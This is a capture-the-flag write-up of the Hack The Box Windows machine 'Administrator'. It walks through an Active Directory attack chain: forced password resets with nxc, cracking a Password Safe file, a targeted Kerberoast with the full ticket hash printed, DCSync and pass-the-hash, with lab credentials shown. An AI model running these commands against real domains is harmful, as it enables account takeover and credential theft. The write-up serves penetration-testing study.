---
title: "Administrator Writeup"
permalink: /Administrator/
box:
  machine_name: "Administrator"
  release: "09 Nov 2024"
  retire: "19 Apr 2025"
  os: "Windows"
  base_points: "Medium [30]"
  difficulty_hist: "/assets/boxes/admin-diff.png"     # optional image
  radar: "/assets/boxes/admin-radar.png"              # optional image
  first_blood_user: "00:06:01 — NLTE (Guru)"
  first_blood_root: "00:09:06 — NLTE (Guru)"
  creator: "mirza (Hacker)"
  machine_url: "https://www.hackthebox.com/machines/administrator"
  scenario: >
    As is common in real-life Windows pentests, you will start the Administrator
    box with credentials for the following account:
    **Username:** Olivia **Password:** ichliebedich
---
<style>
.box-card{border:1px solid #2c2c2c;border-radius:10px;padding:1rem 1rem .5rem;background:#121212;box-shadow:0 0 0 1px #000 inset;margin:1.5rem 0}
.box-card__header{display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #2c2c2c;padding-bottom:.5rem;margin-bottom:.75rem}
.box-card__title{margin:0;font-size:1.6rem;color:#58f87a;letter-spacing:.5px}
.box-card__cta{font-size:.9rem;text-decoration:none;border:1px solid #2c2c2c;padding:.25rem .5rem;border-radius:6px}
.box-grid{display:grid;gap:.25rem}
.box-row{display:grid;grid-template-columns:180px 1fr;gap:1rem;padding:.4rem 0;border-bottom:1px dashed #222}
.box-row:last-child{border-bottom:none}
.box-row>span:first-child{color:#f15;font-weight:700}
.box-row--stack{align-items:start}
.box-img{max-width:460px;width:100%;height:auto;border-radius:6px;border:1px solid #222}
.box-note{display:inline-block;background:#0f1a0f;border:1px solid #224822;padding:.6rem .7rem;border-radius:8px}
</style>

{% include box-info.html data=page.box name=page.title %}

## Nmap Scan
```
nmap -sV -sC -Pn 10.129.245.176 -T4
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-14 15:59 EDT
Nmap scan report for 10.129.245.176
Host is up (0.23s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-15 03:00:22Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-15T03:00:41
|_  start_date: N/A
|_clock-skew: 7h00m46s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.32 seconds
```
From the port scan, we can see that this box is most likely a Kerberos Domain Controller (kerberos, ldap, smb). Using the credentials we were given, we use bloodhound to collect data of the DC to see what permissions our user has.

Looking through our bloodhound output, we see that this user has GenericAll permissions on the Michael user.

<img width="1069" height="298" alt="image" src="https://github.com/user-attachments/assets/df1e9323-88e8-4535-9521-69b9d9bddce3" />

There are many known exploits we can perform to get control over the Michael user and I decided to change the password of Michael. Using nxc over smb, I was able to successfully change this user's password.

```
 nxc smb 10.129.245.176 -u 'Olivia' -p 'ichliebedich' -M change-password -o USER=michael NEWPASS='Password123!'
/home/kali/.local/share/pipx/venvs/netexec/lib/python3.13/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import resource_filename
SMB         10.129.245.176  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
SMB         10.129.245.176  445    DC               [+] administrator.htb\Olivia:ichliebedich 
CHANGE-P... 10.129.245.176  445    DC               [+] Successfully changed password for michael
```

Wanting to confirm if this worked, I used evil-winrm to log into this account and was able to log in.

<img width="1266" height="209" alt="image" src="https://github.com/user-attachments/assets/7df75e10-83b3-4a49-b3c3-085719e76a88" />

Now having access to michael's account, we go back to bloodhound to look at their permissions. We see that Michael has the ForceChangePassword ACL for the benjamin user.

<img width="903" height="152" alt="image" src="https://github.com/user-attachments/assets/267eff91-e86b-40d7-8536-3fa67cf16ffc" />

We can use the same exploit as we did before, using nxc to change the password of the benjamin user.

```
nxc smb 10.129.245.176 -u 'Michael' -p 'Password123!' -M change-password -o USER=benjamin NEWPASS='Password1234!'
/home/kali/.local/share/pipx/venvs/netexec/lib/python3.13/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import resource_filename
SMB         10.129.245.176  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
SMB         10.129.245.176  445    DC               [+] administrator.htb\Michael:Password123! 
CHANGE-P... 10.129.245.176  445    DC               [+] Successfully changed password for benjamin
```
I didn't see anything I could exploit further for the benjamin user in the AD environment, I wanted to look at the other ports to see if maybe either the michael or benjamin user have certain privileges or files that I could obtain.

Starting at the ftp port, I signed in using benjamin's credentials. I was able to log into the ftp server and looking through this directory, we see a backup.psafe3 file

<img width="473" height="249" alt="image" src="https://github.com/user-attachments/assets/f484ae77-0691-4c44-b15b-042580ceb022" />

For those unfamiliar "Including myself before accomplishing this box" a psafe3 file is a password safe database file. This is a database that is usually protected by a master password. Attempting to open this file showed me exactly this.

<img width="891" height="668" alt="image" src="https://github.com/user-attachments/assets/23f123b4-eb16-4424-a90b-4a3267c6f7e4" />

The first thing I thought of is that there might be a john module that works specifically for psafe files, and to my conveinience there is.

```
pwsafe2john Backup.psafe3 
Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
```

So trying to crack this hash with john, I was able to get the cleartext password **tekieromucho** as the master password.

```
john --wordlist=/usr/share/wordlists/rockyou.txt backup_psafe3.hash
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 128/128 AVX 4x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2025-10-14 16:57) 8.333g/s 68266p/s 68266c/s 68266C/s newzealand..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Using the master password I retrieved, I see that there are three users that have credentials stored in this database. I extracted these credentials and put them in a file. All this is shown below

<img width="821" height="560" alt="image" src="https://github.com/user-attachments/assets/d944c2b0-0ccc-4129-833b-e388d051bd7d" />
<img width="378" height="51" alt="image" src="https://github.com/user-attachments/assets/713949fd-7002-4518-a617-86bad9031160" />

Looking back at bloodhound, I see that emily is part of the remote management user group.

<img width="1908" height="385" alt="image" src="https://github.com/user-attachments/assets/122cd041-b0d4-4552-a6fc-8154feea2ef7" />

Using evil-winrm to log in, we get the user flag.

<img width="1266" height="230" alt="image" src="https://github.com/user-attachments/assets/0d187012-6a7a-4f02-a343-b5730f447727" />

We see that emily has GenericWrite privileges over ethan.

<img width="1008" height="171" alt="image" src="https://github.com/user-attachments/assets/8e55faab-515b-4d82-8499-9947ebb0a923" />

I can attempt to do a targetedKerberos attack on ethan's account to look for anything interesting, and going back to bloodhound I see that ethan has dcsync privileges over the administrator domain

<img width="1041" height="197" alt="image" src="https://github.com/user-attachments/assets/1c66ef31-7deb-4a8c-956a-73c308b4004c" />

Attempting to kerberoast ethan's account at first didn't work due to my clock skew.

<img width="1365" height="267" alt="image" src="https://github.com/user-attachments/assets/1c1afa25-2b7a-4f49-99ce-c43dc835e279" />

Setting my clock with ntpdate and then using the python script for targetedKerberoast, I was able to get ethan's Kerberos ticket.

```
┌──(kali㉿kali)-[~/HTB_Labs/Unofficial_CPTS/administrator]
└─$ sudo ntpdate -u administrator.htb
2025-10-15 00:54:18.879186 (-0400) +25246.477354 +/- 0.110148 administrator.htb 10.129.245.176 s1 no-leap
CLOCK: time stepped by 25246.477354
                                                                                                                                                                                                                                                                                                                
┌──(kali㉿kali)-[~/HTB_Labs/Unofficial_CPTS/administrator]
└─$ date -u
Wed Oct 15 04:54:23 AM UTC 2025
                                                                                                                                                                                                                                                                                                                
┌──(kali㉿kali)-[~/HTB_Labs/Unofficial_CPTS/administrator]
└─$ python3 ~/Tools/targetedKerberoast/targetedKerberoast.py -v -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'                                 
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$ebb9560f1e0c2f21b3978f5530ba6cbd$f4b68a91935559abd8f6f32582357dfb2c6fcceaa73b4bb3bc934b0bac4a10c968ecc484d63315308c10b3a7516f5546db1f79be5f28a943865ff2e0754092737c53f1b8b667a917b0a7ed03801bc587545ba679b15208b04d2655d82ed0e287c0c9ec3699406049e629e8ae186627fa853c2f23c509a1650909c345a8711fe74951fb649a78012d4b575b16fc31a9d91222d97aff222fb42f3cc33933e0f14218694648f3c4b503c40720578740808e6fc79b07c65d3e58e1d9af4197fe4f0e56e1caaa461496fcb0a0fcf22797b70909f9c5423ca1bfc987b2ae7ffe45c4795bc5bd2e6b2fa8eb5f37a6b3f0e4dd4e57cae609320ae89f0ac1941eb64aa194367456c8e6bf9362774fb94bd53cda049a68ea97555afa65b4d6e26b674d8e76e1aa32e31cc98b484af55ea06b11ddcbfc167c13402dd81e184e5832cb0d337624f3bb4fc84d41299923e2f4e66040d862710d4a116dd4e5c87ee4875bd2f90c4ac9f240daf4fc192dd05933033ca61b617926f8d573e67a95d084149f4f6b737f3af2146cb33d349a678b847958467452501d78b5db727df8c567cf0995e145fcbfec5b6609b2e44d7d14269a1d66379c7f3b3add25468cfb23c20517923f696f7f169fd5e0f08e406734dad90fd279fec39165c5c3b247454748e007562bf90fc63163031bd4dff7c216beb29ea38d0da623dcf336d7402622e647aee46a934c1fd625f98f2b6592dd2262ae22662884555246b76ee64bc6cbc74e3350320242e72a065e6f2dce34dcd8cbffe3d52ff03db38b489ade93fa9525bfacb81128be127554850175b6a2490f27f77464a86f51f6315f01636923265139bd212977968612f03c1a2c7e5917f60d5533491ed154890f660d8bc126c5deb1f6c20a498eba2ee5776ddc3a03266e433b23114446bf4f88facd86ce75a07c02154cbcb3bea6ca451b14b4bee67283f76ac2483edc22c894bccf761d6386a9be80d3d98732cf754746d12c9927465991bb9f902831aec827718630b50ca466268f48de12a03e0f588ee9edab3c2f87021c02699931e6a66caad7911659dbb4a3dda73d08ee592f9f5e4dd6f7f1fd8ae895e3d4fef4374fbf67e563128e37507b6e9e1530d4af1fd6e454117f578b62af536b9ff4e39327dcc5a0c63dba97473bcf7d552b14ccf250719050059c137050df6a1f9363497cf617d132335f62360b91be43ba23b32a05ad25a274f9c0f8ffbd393214a01320e720a1dcaefd5136cb9b360062e0e183bf6c8b77e503c491d2627dd05492559ffecca27e23a268915a19aa41771d19a456b48ffa8a6d8d17f7ac69d9cc1a4d1a94593e8e0c4da9ea16884549b9c75382e5b4f6074a8283e0f910c0f53bb5ceecc5e4de4fc34a7aaec235b90f01e03f5d92d7a275deb7a66200251deba4eb3c2856aecf9fde7694456952573e57c1062851cd9ff7cb915f10a3e37bf82711c91512a48936a29449eb6a322aafc74e1cf826cc789290775ced2605593f270c3e80aafd70d2d4e69adf83d87afd
[VERBOSE] SPN removed successfully for (ethan)
```

Then using john, I was able to crack ethan's ticket to get their cleartext password 

<img width="810" height="178" alt="image" src="https://github.com/user-attachments/assets/9741919b-232f-4778-8485-192568a3fdd2" />

Now having access to ethan's account, I am not able to dcsync the domain to get any NT hash we want. We get the administrator's hash in order to evil-winrm into the machine using pass-the-hash and get the root flag.

<img width="1490" height="194" alt="image" src="https://github.com/user-attachments/assets/ae86b81f-7c82-4f2b-b114-f5579aef68d2" />


<img width="1483" height="193" alt="image" src="https://github.com/user-attachments/assets/5142843e-1289-4b43-8c4f-80cca704b5d2" />
